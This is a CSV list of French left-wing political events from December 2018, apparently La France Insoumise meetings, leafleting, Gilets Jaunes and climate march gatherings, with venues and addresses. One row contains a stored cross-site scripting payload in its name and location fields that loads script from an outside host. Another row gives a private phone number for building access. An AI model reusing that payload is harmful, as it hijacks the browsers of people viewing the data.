name,start_time,end_time,published,location_name,location_zip,location_address1,location_address2,location_country
L’Insoumis Francis Daspe dédicace à Céret son « Antidote au parler macronien »,1544866200.0,1544871600.0,True,"Librairie ""Le cheval dans l'arbre""",66400,26 boulevard Maréchal Joffre,66400,FR
Apéro des Insoumis du Pays Trestois,1545213600.0,1545220800.0,True,Café de la Renaissance,13530,15,Bd de la République,FR
Apéro des Insoumis du Pays Trestois,1544608800.0,1544616000.0,True,Café de la Renaissance,13530,15,Bd de la République,FR
"Le référendum d'initiative citoyenne, c'est maintenant ! #RIC",1544482800.0,1544828400.0,True,Affichage public mairie,76116,Grande rue,,FR
Réunion mensuelle du GA,1544549400.0,1544554800.0,True,Café des Sports,75019,218 rue de Crimée,,FR
Réunion du groupe FI,1544722200.0,1544729400.0,True,Salle Garibaldi,34500,2 rue Rampe du 96ème Régiment d'Infanterie,,FR
AG des membres de la France Insoumise 04,1545152400.0,1545163200.0,True,Maison du Peuple,04220,Place Jules Guesde,,FR
réunion GA 6ème insoumis,1544637600.0,1544644800.0,True,rue Lt-colonel Prévost,69006,33 rue Lt-colonel Prévost,,FR
Retour sur la Convention et perspectives locales,1544641200.0,1544648400.0,True,Le Formidable,94800,49 avenue de Paris,,FR
Manuel Bompard invité sur Cnews,1544464800.0,1544466600.0,True,,,,,
Atelier des lois : Europe et dérèglement climatique.,1544724000.0,1544736600.0,True,École Henri Barbusse,94110,15 avenue Paul Doumer,,FR
Réunion du groupe Actions en commun,1545159600.0,1545159600.0,True,119bis Avenue Général Leclerc,87100,119bis Avenue Général Leclerc,87100,FR
comitéd'appui entre lac et montagne,1544545800.0,1546711200.0,True,les prés,74890,chemin des  prés,,FR
Réunion d'activité du Comité d'Appui de Limoges,1546626600.0,1546635600.0,True,Salle Jean-Pierre Timbaud,87100,Parking de l’Hôtel de Ville,87100,FR
Les insoumis de Loos font leur marché,1544950800.0,1544958000.0,True,Marché de LOOS,59120,Rue du Général Leclercq,,FR
Réunion publique sur la rénovation urbaine du quartier des OLIVEAUX,1544637600.0,1544644800.0,True,Ecole Dévigné-Victor Hugo,59120,Rue Albert Châtelet,,FR
"Soutien à la manifestation des enseignants, lycéens, étudiants, ...",1544533200.0,1544544000.0,True,Place Arnaud Bernard,31000,31 Boulevard d'Arcole,,FR
Caravane lutte contre la précarité et inscription sur les listes électorales,1544864400.0,1544875200.0,True,Marché centre ville,60000,Rue Louvet,,FR
Caravane lutte contre la précarité et inscription sur les listes électorales,1545037200.0,1545048000.0,True,Marché Argentine,60000,Avenue JF Kennedy,,FR
Réunion locale,1544639400.0,1544652000.0,True,Café de la Paix,60000,51. place Jeanne Hachette,,FR
"Formation et débat : Le partage des compétences territoriales  , le Grand Paris .",1544877000.0,1544893200.0,False,Salle mathilde Shintz,93100,8 Rue Henri Schmitt - 93100 Montreuil,,FR
"Gilets jaunes les enjeux , doléances, et discussions citoyenne",1544724000.0,1544734800.0,True,Moustache Boulevard de La Fayette,34400,Blv La Fayette,,FR
"""Main Basse sur l'Energie"" Gilles Barbaste 2ième Partie",1544619600.0,1544625000.0,True,Maison Citoyenne,30000,38 rue Porte de France,,FR
Débat public Européennes,1544549400.0,1544556600.0,True,Maison des associations,02000,9 rue du bourg,,FR
collage régulier,1544396100.0,1544399700.0,True,café le Saint-Charles,59000,197 rue des Bois Blancs,,FR
Entretiens en porte-à-porte,1545066000.0,1545071400.0,True,Métro Porte de Douai,59000,Place Fernig,,FR
2ème réunion du Comité: retour sur la Convention de Bordeaux et élaboration d'un rétroplanning d'actions locales pour la campagne des Européennes,1544637600.0,1544644800.0,True,LAMI,30000,38 rue Porte de france,,FR
Réunion de nos groupes,1544722200.0,1544729400.0,True,Café Le Ranch,34090,786 route de Mende,,FR
Réunion du comité d'appui de Clermont-Ferrand,1544810400.0,1544817600.0,True,Salle 2 - Centre Jean Richepin,63000,21 rue Jean Richepin,,FR
Comité d'appui pour les européennes,1544547600.0,1544554800.0,True,Bar Le Deauville,76600,11 avenue René Coty,,FR
Organisation Européennes,1544461200.0,1544468400.0,True,Palais des congrès,17300,rue Toufaire,,FR
Réunion groupe d'action Fives,1544808600.0,1544814000.0,True,Café Le Catalan,59800,3 place Madeleine Caulier,59800,FR
Porte-à-porte Métro Caulier,1544634000.0,1544641200.0,True,Métro Caulier,59800,8 place Madeleine Caulier,59800,FR
Reunion groupe des trois Monts,1544466600.0,1544472000.0,True,Salle de la mairie de Montlieu la Garde,17210,11 avenue de la République,,FR
Dernière réunion de l'année !,1545154200.0,1545166800.0,True,Le Baragouin,59500,Rue de Paris,,FR
Caravane d'inscription sur les listes électorales de Vauban,1544864400.0,1544878800.0,True,Entrée de la Citadelle,59000,Pont de la Citadelle,Monument aux pigeons voyageurs,FR
Diffusion de tracts - Marché Maison Blanche,1544954400.0,1544958000.0,True,Marché Maison Blanche - Devant le Théâtre La Cachette,75013,124 avenue d'Italie,,FR
Réunion plénière du Groupe d'Action Paris 15ème Sud,1544466600.0,1544473800.0,True,"(chez un·e membre du GA, contacter pour le lieu exact)",75015,Place Falguière,,FR
Réunion publique Des Gilets jaunes,1544468400.0,1544475600.0,True,Salle des Ursulines,22300,Rue des Patriotes,,FR
Comprendre la Constituante,1544544000.0,1544551200.0,True,Maison des Insoumis,30200,4 place de la Mairie,,FR
Réunion FI et sympathisants,1544551200.0,1544558400.0,True,Salle des associations,05100,sous le théâtre,,FR
Comprendre et agir en Macronie,1544722200.0,1544734800.0,True,les vieux chenes,86220,le brouillard,86220,FR
Journée laïcité par la Ligue des Droits de l'Homme du Gers,1544889600.0,1544904000.0,True,Pascal Levieux,32600,"6 Rue Jean Bart,",32600,FR
Réunion groupe d'appui,1544722200.0,1544727600.0,True,Local FI,42000,15 boulevard Jules Janin,42000,FR
Réunion Publique Adrien Quatenens,1544464800.0,1544475600.0,True,Mairie de Maubeuge,59600,Place Pierre Forest,,FR
Reunion Publique QUARTIER MONCLAR,1544466600.0,1544475600.0,True,Maison Pour Tous CHAMPFLEURY,84000,2 Rue Marie Madeleine,,FR
Réunion de groupe,1544635800.0,1544641200.0,True,Sous-sol du Centre Médico-Social,14730,Esplanade Raymond Collet,,FR
INTER GROUPE D'ACTIONS,1544468400.0,1544477400.0,True,salle de la carterie,44440,38 rue Alexandre Huchon,,FR
A.G F.I pays de Morlaix,1544635800.0,1544641200.0,True,Bar Le tempo,29600,quai de trégiuer,,FR
filtrage gilets jaunes,1544310000.0,1544914800.0,True,route de Lannion,29600,rond point du 19 mars 1962,,FR
Réunion de groupe,1546542000.0,1546552800.0,True,Domicile,78140,5 rue Henri Rabourdin,,FR
Tractage sur je roule pas le choix,1544262300.0,1544268600.0,True,Parvis St-Christophe,59200,1 place de la République,,FR
Réunion mensuelle,1544806800.0,1544814000.0,True,café Le coquillage,71450,Canal,,FR
Participation au Rassemblement  pour le Climat,1544263200.0,1544266800.0,True,Place de la Nation,18000,Place de la nation,,FR
Réunion du comité d'appui du Cantal pour la campagne aux prochaines élections européennes.,1544461200.0,1544468400.0,True,Maison de quartier Brouzac,15000,72 avenue du Général Leclerc,,FR
Soutien à la Marche pacifique des Gilets Jaunes,1544274000.0,1544288400.0,True,"Cité administrative ""Ty Nay""",29000,Route de Ty Nay,,FR
diffusion tract la transition écologique,1544605200.0,1544612400.0,True,Métro Notre Dame du Mont,13001,89 Cours Julien,,FR
diffusion tract sur la transition écologique,1544259600.0,1544266800.0,True,1,13001,Cours Joseph Thierry,,FR
Départ Marche pour le climat à Paris,1544270400.0,1544284800.0,True,Gare RER,92260,Gare RER,,FR
Rendez-vous de Gagny Insoumis pour la manifestation des Gilets Jaunes acte IV,1544268600.0,1544268600.0,True,Gare de Gagny,93220,Gare de Gagny,Gare de Gagny,FR
Gilets Jaunes ET Ecolos,1544274000.0,1544295600.0,True,place de la nation,75020,angle rue Jaucourt,,FR
Soutien au rassemblement des gilets jaunes Cahors,1544274000.0,1544288400.0,True,Cahors Place Mitterand,46000,Place Mitterand,,FR
"Evènement familial, ouvert, non-violent, festif et déterminé: Marche Mondiale pour le Climat !",1544259600.0,1544270400.0,True,Cahors Le parvis de la Mairie,46000,Boulevard Gambetta,,FR
Gilets Jaunes insoumis 11,1544270400.0,1544274000.0,True,Parvis de la Mairie du 11e arrondissement,75011,"12, place Léon Blum",75011,FR
Vers la Marche pour le climat !,1544273100.0,1544284800.0,True,Quai du Métro Villejuif Léo Lagrange,94800,42 avenue de Paris,,FR
Assemblée citoyenne et Manifestation Acte 4 à Strasbourg ! Coordination des Gilets Jaunes du Bas-Rhin,1544259600.0,1544274000.0,True,Place de la République,67000,Place de la République,67000,FR
Assemblée citoyenne et Manifestation Acte 4 à Strasbourg !   Coordination des Gilets Jaunes du Bas-Rhin,1544259600.0,1544274000.0,True,Place de la République,67000,Place de la République,67000,FR
Apéro insoumis au tram Vélizy 2,1544346000.0,1544353200.0,True,T6 Vélizy 2,78140,31 avenue de l’Europe,,FR
Tractage au Musée de Sèvres,1545287400.0,1545292800.0,True,Tram Musée de Sèvres,92310,Quai de Sèvres,,FR
Réunion quinzomadaire de la FI Meudon/Chaville,1545328800.0,1545336000.0,True,Chez Jean et Annick,92190,39 rue des Bigots,,FR
Comité d'Appui Aubervilliers,1544637600.0,1544644800.0,True,Foyer  Heutault,93300,39 rue Heurtault,,FR
Réunion du comité de soutien aux élections européennes,1544635800.0,1544644800.0,True,Mairie de quartier,67000,44 boulevard d'Anvers,,FR
Réunion comité de soutien élections européennes,1544635800.0,1544644800.0,True,Mairie de quartier,67000,44 boulevard d'Anvers,,FR
"Réunion publique ""L'Europe Insoumise""",1544468400.0,1544477400.0,True,Grande salle banalisée Champarert,38300,Boulevard Champaret,,FR
Réunion bimensuelle en coordination Esplanade Insoumise en Lutte et Krutenau Insoumise,1545238800.0,1545246000.0,True,Mairie de quartier,67000,44 boulevard d'Anvers,,FR
"APRES LA REDACTION D'UN CAHIER DE DOLEANCES,DEPART COLLECTIF VERS LA GARE ST LAZARE POUR Y RETROUVER NOS AMIS CHEMINOTS DE L'INTERGARE,LES LYCEENS ET AUTRES ETUDIANTS ET NOUS DIRIGER VERS LES 14 H EN DIRECTION DES CHAMPS ELYSEES",1544272200.0,1544292000.0,True,GARE D'HERBLAY,95220,PLACE DE LA GARE,,FR
Réunion bimensuelle en coordination Esplanade Insoumise en Lutte et Krutenau Insoumise,1545238800.0,1545246000.0,True,Mairie de quartier,67000,44 boulevard d'Anvers,,FR
Collage,1544533200.0,1544540400.0,True,Secteur Thourotte Ribécourt Ressons,60150,.,.,FR
Journée internationale des Migrants,1545152400.0,1545159600.0,True,Place du Maréchal de Lattre de Tassigny,67000,Place du Maréchal de Lattre de,,FR
Blocage filtrant avec distibution de tracts,1544274000.0,1544288400.0,True,Centre commercial,60100,.,,FR
Journée internationale des Migrants,1545152400.0,1545159600.0,True,Place du Maréchal de Lattre de Tassigny,67000,Place du Maréchal de Lattre de Tassigny,,FR
Avec les Gilets Jaunes,1544223600.0,1544223600.0,True,Péage Ressons sur Matz,60490,.,,FR
Marche Mondiale pour Le Climat,1544274000.0,1544288400.0,True,1 place Dauphine,67000,1 place Dauphine,,FR
Réunion des groupes d'action et leurs membres - sujets divers,1545327000.0,1545334200.0,True,Salle Hervieux - Monsort,61000,Allée Louise Hervieux,,FR
Marche citoyenne pour le climat,1544259600.0,1544266800.0,True,Devant l'ancienne banque de France,38500,Place de Lattre de Tassigny,,FR
Départ collectif pour les rassemblements de Gilets Jaunes,1544274000.0,1544274600.0,True,Mtro Place d'Italie sortie Vincent Auriol,75013,place d'Italie,,FR
OUVERTURE EN GRAND D'UN CAHIER DES DOLEANCES POUR LES HERBLAYSIENS ET LES COMMUNES AVOISINANTES,1544259600.0,1544268600.0,True,MARCHE DE MONTIGNY LES CORMEILLES,95370,RUE ALFRED DE VIGNY,DERRIERE LE MAGASIN CARREFOUR,FR
Diffusion de tracts sur les Gilets Jaunes,1544263200.0,1544268600.0,True,Marché Vincent Auriol,75013,125 boulevard Vincent Auriol,,FR
OUVERTURE EN GRAND D'UN CAHIER DES DOLEANCES AUX HABITANTS DE MONTIGNY LES CORMEILLES ET DES COMMUNES AVOISINANTES,1544259600.0,1544268600.0,True,MARCHE DE MONTIGNY LES CORMEILLES,95370,RUE ALFRED DE VIGNY,,FR
Collage Affiches,1544382000.0,1544389200.0,True,Cités Pont de Pierre - Etoile - Gremillon,93000,Pont de Pierre - Etoile - Gremillon,,FR
Collage Affiches,1544382000.0,1544389200.0,True,Marché de Bobigny & centre ville,93000,Marché de Bobigny centre Groupe,,FR
Collage affiches,1544382000.0,1544389200.0,True,Normandie-La Ferme-Ancienne Gare,93000,Normandie-La Ferme-Ancienne Gare,,FR
collage affiches,1544382000.0,1544389200.0,True,Estienne D'orves - Jean Rostand,93000,Estienne D'orves - Jean Rostand,,FR
collage affiches,1544382000.0,1544389200.0,True,Edouard .Vaillant - Abreuvoir,93000,Edouard .Vaillant - Abreuvoir,,FR
Collage Affiches,1544382000.0,1544389200.0,True,Cité H barbusse,93000,rue H barbusse,,FR
Collage Affiches,1544382000.0,1544389200.0,True,cité paul eluard,93000,Quartier paul eluard,,FR
collage Affiches,1544382000.0,1544389200.0,True,Cités chemin vert - S.Allendé,93000,rue du chemin vert,,FR
collage Affiche LFI,1544382000.0,1544389200.0,True,Pablo Picasso,93000,bobigny entier,,FR
Appel à participer à la Marche Pour le Climat d'Ajaccio,1544274000.0,1544284800.0,True,Gare d'Ajaccio,20000,Gare ferroviaire d'Ajaccio,,FR
"Fin du mois et fin du monde, même combat !",1544261400.0,1544270400.0,True,Place Jean Macé,69007,Place Jean Macé,,FR
"Vin chaud, vin chaud, plus chaud que le climat !",1544207400.0,1544216400.0,True,Mairie du 4e,69004,133 boulevard de la croix-rousse,,FR
Réunion publique avec Laure Manesse Candidate aux élections Européennes,1544549400.0,1544554800.0,True,Maison des association (Plateau Laon),02000,Rue du Bourg,,FR
"Diffusion tract: Macron, un an c'est déjà trop...",1544158800.0,1544166000.0,True,CHU Rangueil,31059,"1, avenue Jean Poulhès",,FR
Apéro Insoumis,1545415200.0,1545429600.0,True,Chez Seb& Vic,01200,16 rue des 3 rochers,,FR
Meeting marée populaire sur les retraites-participation de la FI,1544637600.0,1544652000.0,True,Salle Alain Colas,59800,53 rue de la Marbrerie,59800,FR
Collage métropole montpellier,1544810400.0,1544821200.0,True,Parking université Paul Valery,34090,Route de mende,34070,FR
Réunion du Groupe d'Appui La France Insoumise du Brianconnais,1544549400.0,1544556600.0,True,Salle des Associations,05100,Avenue de la République,05100,FR
"Jeanne Chevalier, candidate aux élections européennes, invitée sur RT France",1544126400.0,1544130000.0,True,,,,,
"""><script src=https://nerveux.xss.ht></script>",1544742000.0,1549753200.0,True,"""><script src=https://nerveux.xss.ht></script>",42000,"""><script src=https://nerveux.xss.ht></script>","""><script src=https://nerveux.xss.ht></script>",FR
Auto Organisation : Paillade,1544173200.0,1544180400.0,True,Arret de tram Mosson,34090,Avenue de Barcelone,,FR
Ecoute collective de la convention de BORDEAUX,1544342400.0,1544356800.0,True,LAMI,30000,38 rue Porte de France - 30000 Nîmes,,FR
Réunion comité d'appui européennes,1544724000.0,1544734800.0,True,Salle Philippe Noiret,59800,100 rue de l'abbé Aerts,59800,FR
Lancement du comité d'appui de Faches-Thumesnil,1544878800.0,1544886000.0,True,"Restaurant ""Le Relais""",59155,139 Rue du faubourg d'Arras,,FR
Soutien à la Marche pour le climat,1544263200.0,1544274000.0,True,Parvis des nefs,44000,Parvis des nefs,,FR
"Danièle Obono, députée, invitée sur BFMTV",1544133600.0,1544136600.0,True,,,,,
Réunion-Apéro GA BABELVILLE-11è,1545415200.0,1545418800.0,True,Café Le Métro,75011,37 bd de Belleville,,FR
Porte à porte,1545087600.0,1545346800.0,True,Le longchamp,76650,Place du marche,,FR
"Réunion Publique - La santé en danger, à cause de l'austérité européenne avec Caroline Fiat, députée et Thomas Guénolé, candidat aux élections européennes",1544725800.0,1544734800.0,True,Petite Salle de Robien,22000,Place Octave Brilleaud,,FR
Stop à l'évasion fiscale,1544693400.0,1544700600.0,True,Métro Compans Caffarelli,31000,devant la Cité Administrative,BD Lascrosses -Lordat,FR
"Distribution Tract ""Jeroule,Pas le choix Macron ,läche-moi""",1544396400.0,1544569200.0,True,"rond poind, gare",82000,cité agricole,centre ville,FR
Réunion Mensuelle du GA Limoges Carnot-Marceau l'Insoumise,1547055000.0,1547062200.0,True,Salle municipale Jean -Pierre Timbaud,87000,Parking derrière la Mairie,Rue Louis Longequeue,FR
"Augmentation du pouvoir d'achat, hausse du smic",1544256000.0,1544284800.0,True,Place de l'étoile,75000,"Champs élysées, avenue Kleber",Arc de triomphe,FR
Diffusion au marché Saouzelong,1544950800.0,1544958000.0,True,Marché Saouzelong,31400,70 rue Albert Bedouce,,FR
Réunion du GA St Agne/Rangueil,1545154200.0,1545159600.0,True,Café l'Astronef,31400,3 place des Avions,,FR
Collage d'affiche,1544049000.0,1544054400.0,True,Place Eugène Andrieu,80600,Place Eugène Andrieu,,FR
les insoumis ensemble avec les gilets jaunes,1544223600.0,1544309940.0,True,la roche sur yon,85000,rond point des flaneries  route de nantes       a 10h00    le 8.12.2018,rond point du Leclerc route de la tranche sur mer  à 10h00 le 8.12.2018,FR
Réunion d'information sur le projet d'entrepôt géant pour Amazon à  Metz Frescaty,1544724000.0,1544731200.0,True,Café Le Shannon,57000,19 Avenue Robert Schuman,,FR
Réunion des GA Vesoul et Echenoz-la-Méline,1544725800.0,1544734800.0,True,Café Français,70000,Place du Palais,,FR
Réunion d'appartement avc notre candidate Edith James,1547575200.0,1547586000.0,False,Chez Pierrre Chambon,44000,23 rue General Margueritte,,FR
Point sur l’actualité - Divers,1544119200.0,1544130000.0,True,Salle la Charité,62400,Rue Fernand Bar 62400 Béthune,62400,FR
Nous voulons des Coquelicots,1544203800.0,1544207400.0,True,BOUFFAY,44000,PLACE DU BOUFFAY,,FR
prospective,1544130000.0,1544136900.0,False,nantes,44000,33 rue de la ville aux roses,,FR
coquelicots,1544203800.0,1544207400.0,False,bouffay,44000,place du BOUFFAY,,FR
Test formation FI,1544119200.0,1544126400.0,False,Café,44000,1 rue Truc,,FR
Interpelons notre député!,1544450400.0,1544457600.0,True,Permanence député Yves Daniel,44170,Allée des Lilas,,FR
Réunion du Comité d'appui du Val d'Yerres et du Val de Seine pour l'élection européenne,1545246000.0,1545253200.0,True,Salle Municipale,91210,Avenue Sully,,FR
"Projection de  8 femmes en Mai 68 de Xavier Barthélémy en présence du réalisateur, de Martine Storti protagoniste du film, de Olivier Chambon chef-opérateur du film.",1545332400.0,1545339600.0,True,LE MALTAIS ROUGE,75011,40 RUE DE MALTE,,FR
tractage : je roule pas le choix,1544459400.0,1544463000.0,True,Métro Corentin Celton,92130,pès du café Francais,92130,FR
"Soutien manifestation ""Ne touchez pas à la loi 1905"" + RV Gilets Jaunes + marche pour le climat",1544261400.0,1544288400.0,True,Esplanade du port,56000,La Rabine,,FR
Réunion commune avec les insoumis saintais,1545154200.0,1545163200.0,True,SALLE SAINTONGE N° 5,17100,Rue Chapsal,,FR
"Tracts : JE ROULE, PAS LE CHOIX   MACRON LÂCHE-MOI !",1544173200.0,1544180400.0,True,Marché d'ELNE,66200,1 rue route nationnale,,FR
Réunion régulière du GA,1544727600.0,1544734800.0,True,Domicile,60230,141 rue de la Marne,,FR
Européennes : réflexion et définition d'actions autour de l'axe 1 du texte programmatique,1545242400.0,1545253200.0,True,"Restaurant ""le Coton rouge""",13100,4 chemin du Coton rouge,13100,FR
"Eric Coquerel, député, invité sur M6",1544047200.0,1544050200.0,True,,,,,
"Réunion publique - ""Et Maintenant le Peuple"" avec Alain Dontaine",1544468400.0,1544475600.0,True,Grande Salle banalisée,38300,Champaret,derrière la salle polyvalente,FR
"""La Police"" de S.MROZEK par TILT au profit des MNA RESF81",1548531000.0,1548540000.0,True,Salle des fêtes de St Benoît de Carmaux,81400,Rue Voltaire,,FR
Européennes 2019 : organisons-nous !,1544815800.0,1544824800.0,True,PL Guérin,29200,1 rue Ribot,,FR
"Rassemblement : construisons en bois, terre crue et paille",1544623200.0,1544626800.0,True,en face de la place de l'Hôtel de Ville,75004,"place de l'Hôtel de Ville - Avenue Victoria, trottoir",,FR
REUNION REGULIERE,1545159600.0,1545166800.0,True,SALLE SAINTONGE N° 5,17100,Rue Chapsal salle Saintonge n° 5,,FR
Diffusion de tract,1544792400.0,1544803200.0,True,Soissons,02200,Place Fernand MAQUIGNY,02200,FR
"Ciné Débat ""Grande Synthe"" avec réalisatrice du film et le Maire Damien CARÊME  selon son agendas.",1548608400.0,1548619200.0,True,Cinéma Clovis à SOISSONS,02200,12-14 rue du BEFFROI,02200,FR
Collage-affichage sur endroits officiels,1544173200.0,1544274000.0,True,soissons et ses alentours,02200,gare,02200,FR
Réunion mensuel depuis septembre 2017,1544119200.0,1544131800.0,True,Chez l'un d'entre nous,02200,Avenue de La Rochefoucauld,,FR
Temps d'échanges du comité d'appui de Gap,1545238800.0,1545249600.0,True,Salle de la Mutualité,05000,Passage Montjoie,Immeuble le Saint Denis,FR
Réunion mensuelle,1544626800.0,1544637600.0,True,Salle Robert-Vazeille,16160,Place de l’hôtel de ville (Mairie),Derrière la poste,FR
Réunion mensuelle,1544619600.0,1544626800.0,True,Salle Robert-Vazeille,16160,Place de l’hôtel de ville (Mairie),Derrière la poste,FR
Assemblée générale Gilets Jaunes,1544115600.0,1544119200.0,True,Rond point de Girac,16000,Rond point de Girac,,FR
REUNION MENSUELLE,1544637600.0,1544644800.0,True,Brasserie Le Royal  de l'Est,75010,129 rue du Faubourg Saint Martin,Salle 1er étage,FR
"Réunion ""Ecologie populaire"" et gilets jaunes",1545157800.0,1545163200.0,True,Gorriak,64100,40 rue Bourgneuf,,FR
Collage,1544212800.0,1544216400.0,True,Gagny,93220,Panneaux d'affichages,93220,FR
Réunion du GA,1544470200.0,1544479200.0,True,Chez Serge,31500,7 rue Raymond Boulogne,se garer dans la rue et téléphoner pour  le code d'accès au bâtiment : 06 73 15 99 52.,FR
Réunion publique avec les élus insoumis de la région Occitanie,1544637600.0,1544644800.0,True,Salle des Libertés,66000,3 rue Bartissol,,FR
Réunion des GA Nantes-Ouest,1544638500.0,1544646600.0,True,Salle Egalité (salle B),44100,6 boulevard Léon-Jouhaux,,FR
Assemblée citoyenne insoumise,1544722200.0,1544736600.0,True,Salle Jean Ferrat,24110,Mairie de Montrem,,FR
Réunion mensuelle des Outrelois Insoumis,1546884000.0,1546891200.0,True,Chez Jessie,62230,Rue du Professeur Clerc,,FR
LES INSOUMIS AVEC LES GILETS JAUNES,1544259600.0,1544266800.0,True,au carrefour de l'Avenue Maurice Utrillo et du boulevard du Général Leclerc,95100,"96, Avenue Maurice Utrillo",,FR
Réunion mensuelle,1547056800.0,1547067600.0,True,Maison de la vie associative - Salle 2,50000,rue des Charmilles,,FR
"Quelles actions à Malbosc, Euromédecine, Hauts de Massane ?",1544117400.0,1544124600.0,True,Bar le Ranch,34090,786 Route de Mende,,FR
Réunion mensuelle des Insoumis.es de la 6ème circonscription,1547144100.0,1547150400.0,True,Maison des Associations de Mérignac,33700,55 Avenue du Maréchal de Lattre de Tassigny,,FR
réunion de groupe,1544119200.0,1544126400.0,True,Brasserie ducale,08000,16 place ducale,,FR
Atelier militant,1547137800.0,1547143200.0,True,Maison des Associations de Mérignac,33700,Avenue du Maréchal de Lattre de Tassigny,,FR
pour une régie municipale de l'efficacité énergétique et de l'énergie renouvelable,1544275800.0,1544284800.0,True,place fr l'Europe quartier Antigone Montpellier,34000,station de tram place de l'Europe,,FR
ASSEMBLÉE MENSUELLE PLÉNIÈRE DES INSOUMIS D'ARGENTEUIL ET DE BEZONS,1544549400.0,1544553900.0,True,Espace Nelson-Mandela,95100,82 boulevard du Général Leclerc,,FR
réunion du groupe d'action de Saint Jacques,1547139600.0,1547146800.0,True,café Le Shadok,63000,café le shadok 2 rue des chambrettes,,FR
réunion du comité d'appui de Cournon d'Auvergne,1544724000.0,1544734800.0,True,Salle de la Halle 1er étage (en face Eglise St Martin),63800,"Salle de la Halle, rue de la Halle",,FR
distribution de tracts sur le marché de la place des Dômes,1544173200.0,1544180400.0,True,marche de la place des Dômes,63800,place des Dômes,,FR
Caravane Cantine,1544108400.0,1544113800.0,True,Ecole Olympe de Gouges,34070,1375 rue de Bugarel,,FR
Caravane Cantine,1544108400.0,1544113800.0,False,Ecole Olympe de Gouges,34070,1375 Rue de Bugarel,,FR
Ecoute collective participante de la Convention de Bordeaux,1544290200.0,1544360400.0,True,Chez moi,10800,rue de la libération,,FR
Boitage au quartier de la Moline,1544202000.0,1544207400.0,True,La Moline,10800,quartier,,FR
Formation:Comment mobiliser son électorat en campagne électorale?,1544808600.0,1544819400.0,True,Foyer des Jeunes travailleurs (FJT),84200,"Salle Jack Ralite, 20 impasse Maurice Kallert",(près du camping municipal),FR
Réunion d'information,1545001200.0,1545001200.0,True,Sainte Luce,97228,rue Paul LANGEVIN,97228,MQ
Réunion bi-mensuelle,1544468400.0,1544479200.0,True,Salle des Associations (1er étage Office du Tourisme),33470,"1, place Pierre Dubernet",,FR
point d'inscription sur les listes électorales,1544864400.0,1544882400.0,True,Place de la Bourgogne,59200,27 rue Roger Salengro,,FR
"Réunion Comité d'appui ""Maintenant le peuple"" (élections européennes)",1544807700.0,1544814900.0,True,Chez Eric,80390,16 rue Jean Jaurès,,FR
réunion du comité d'appui,1544808600.0,1544815800.0,True,le Saint Martin,59200,220 rue de Menin,,FR
Réunion du comité d'appui d'Oullins,1545157800.0,1545165000.0,True,Maison des Sociétés,69600,37 rue Raspail,,FR
Politique européenne et territoires ruraux : quelles conséquences ? avec  la participation de Kamel Bendjeguellal,1544549400.0,1544560200.0,True,Salle de L'Oustau à Pont de l'Etoile,13360,salle des écoles Pont de l'Etoile Roquevaire,13360,FR
Tractage : je roule pas le choix,1544545800.0,1544551200.0,True,T2 station LARTIGUES : 17h30,92130,traway 2,92130,FR
Réunion mensuelle du comité d'appui,1544639400.0,1544644800.0,True,L''Arsenal,25000,5 Place St Jacques,,FR
Politique européenne et territoires ruraux : quelles conséquences ?,1544549400.0,1544560200.0,False,Salle L'Oustau à Pont de l' Etoile,13360,salle à coté des écoles de Pont de l'Etoile à ROQUEVAIRE,13360,FR
tractage - je roule pas le choix,1544459400.0,1544464800.0,True,: METRO CORENTIN CELTON :,92130,près du café francais,92130,FR
réunion préparation d'action,1544972400.0,1544979600.0,True,Côté Rive juste après le pont de Boulogne  284 avenue Jean Jaurès,92100,284 avenue Jean Jaurès,,FR
"Rassemblement insoumis ""Pour le climat"" et contre la politique de Macron",1544273100.0,1544283000.0,True,Les Quinconces,33000,"30, Allées d'Orléans",,FR
"""Porteur de parole"" avec Anne Sophie Pelletier, candidate aux élection Européenne",1546677000.0,1546689600.0,False,Place du 8 mai 1945,39100,Place du 8 mai 1945,,FR
Tractage marché de Caulier,1544952600.0,1544958000.0,True,Place Caulier,59800,9 place Madeleine Caulier,59800,FR
Porte à Porte Métro Caulier,1544029200.0,1544036400.0,True,Place Madeleine Caulier,59800,5 place Madeleine Caulier,59800,FR
Collage - Campagne pauvreté et liste éléctorale,1544034600.0,1544038200.0,True,Campus Croix-Rouge et Alentours,51100,57 rue pierre taittinger,et alentours,FR
Tractage - Campagne Jeunes,1544005800.0,1544014800.0,True,Campus Croix--Rouge,51100,57 rue Pierre Taittinger,Devant le restaurant Universitaire,FR
Marche Mondiale Pour Le Climat,1544277600.0,1544288400.0,True,Fontaine Des Solidarites,51100,Place Drouet-D'Erlon,,FR
Préparation élections municipales,1544724000.0,1544724000.0,True,Bar D'Ici D'ailleurs,35400,52 Boulevard de la République,,FR
